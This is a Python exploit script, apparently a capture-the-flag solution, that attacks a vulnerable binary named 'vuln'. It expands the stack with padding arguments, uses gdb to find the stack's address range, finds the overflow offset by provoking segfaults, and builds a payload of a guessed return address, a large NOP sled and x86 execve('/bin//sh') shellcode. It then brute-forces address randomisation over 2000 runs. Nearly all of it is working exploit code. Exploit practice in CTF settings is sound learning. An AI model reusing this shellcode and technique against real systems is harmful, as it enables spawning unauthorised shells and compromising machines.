import subprocess
import struct
import os
import re

#this program has PIE enabled -> compilation option that changes the location of the executable in every run

#first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
# python3 -c "import sys; trash=b'B'\*131000; sys.stdout.buffer.write(trash)" > trash
trash = b'B'*131070
open("trash", "wb").write(trash)

# os.remove("trash")

#then call gdb to find in what adresses the stack fluctuates -> info proc mapping
gdb_process = subprocess.Popen(['gdb', '/problems/4b949c34faacd4f6a5452ec76a365dbf/vuln'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
commands = """
b vuln
r `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`
info proc mapping
q
y
"""
output, errors = gdb_process.communicate(commands)

# Find the line containing the word "stack" and extract the address in the middle
output_lines = output.split('\n')
stack_line = next((line for line in output_lines if 'stack' in line), None)
pattern = r'\b0x[0-9a-f]+\b|\[stack\]'
matches = re.findall(pattern, stack_line)
start_address = int(matches[0], 16)
end_address = int(matches[1], 16)
middle = (start_address + end_address) // 2

#find where the buffer overflows
overflow = b'A'
while True:
    vuln_proc = subprocess.Popen(["./../problems/4b949c34faacd4f6a5452ec76a365dbf/vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    vuln_output, _ = vuln_proc.communicate(overflow)

    if vuln_proc.returncode == -11:
        print(f"Segmentation fault occurred with buffer length: {len(overflow)}")
        #not sure why the program crashes at 136 bytes length, will add 4 bytes to the buffer to cover ebp and reach the returd address location. Must change!
        overflow += b'A'*4

        #constructing the payload
        # python3 -c "import sys; payload=b'B'*140; payload+=b'\x04\x80\xb5\xff'; payload+=b'\x90'*100000; payload += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; sys.stdout.buffer.write(payload)" > vuln_payload
        payload = overflow
        payload += struct.pack("<I", middle)
        payload += b'\x90' * 100000
        payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
        open("vuln_payload", "wb").write(payload)

        #performing brute force attack
        #while true; do cat /tmp/vuln_payload - | ./vuln `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash` `cat /../../tmp/trash`; done
        exploit_command = ["cat", "vuln_payload", "-", "|", "./../problems/4b949c34faacd4f6a5452ec76a365dbf/vuln"]
        exploit_command += ["`cat trash`"] * 15 

        for i in range(2000):
            print(i)
            exploit_proc = subprocess.Popen(exploit_command, shell=True)
            exploit_proc.wait()

        
        break
    else:
        overflow += b'A'

os.remove("trash")
os.remove("vuln_payload")

